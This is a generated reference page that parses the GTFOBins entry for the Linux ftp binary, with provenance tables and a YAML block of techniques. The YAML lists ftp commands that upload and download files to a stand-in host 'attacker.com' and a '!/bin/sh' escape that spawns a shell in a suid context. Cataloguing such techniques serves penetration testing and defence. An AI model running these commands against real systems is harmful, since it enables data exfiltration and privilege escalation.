---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [ftp](../../tools/linux/ftp.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | ftp |
| name | ftp |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/ftp/ |

## Preserved Source Material

```yaml
_body: ''
_name: ftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp
functions:
  download:
  - code: 'ftp -a attacker.com

      get /path/to/input-file output-file'
    comment: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    sender: ftp-server
  shell:
  - code: 'ftp

      !/bin/sh'
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
  upload:
  - code: 'ftp -a attacker.com

      put /path/to/input-file output-file'
    comment: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    receiver: ftp-server
```
